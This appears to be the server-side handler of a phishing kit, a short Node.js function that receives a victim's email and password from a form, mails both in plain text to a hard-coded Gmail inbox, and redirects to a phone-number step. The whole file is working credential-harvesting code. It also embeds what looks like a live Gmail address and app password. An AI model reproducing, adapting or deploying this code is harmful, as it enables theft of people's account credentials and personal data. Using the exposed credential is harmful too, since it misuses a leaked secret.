const nodemailer = require('nodemailer');
const querystring = require('querystring');

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const params = querystring.parse(event.body);
  const { password, email } = params;

  console.log('Password step - Email:', email, 'Password:', password ? '***' : 'MISSING');

  // Send email to admin with both email and password
  try {
    await sendEmail('User Email: ' + email + '\nPassword: ' + password);
    console.log('Email sent successfully for:', email);
  } catch (error) {
    console.error('Error sending email:', error.message);
  }

  return {
    statusCode: 302,
    headers: {
      Location: '/phone.html?email=' + encodeURIComponent(email),
    },
    body: '',
  };
};

async function sendEmail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'bhanukiran750@gmail.com',
      pass: 'okkxrhicnhxivbvi'
    }
  });

  const mailOptions = {
    from: 'bhanukiran750@gmail.com',
    to: 'bhanukiran750@gmail.com',
    subject: 'User Data Submission - Password',
    text: message
  };

  try {
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.response);
  } catch (error) {
    console.error('Email send error:', error);
    throw error;
  }
}
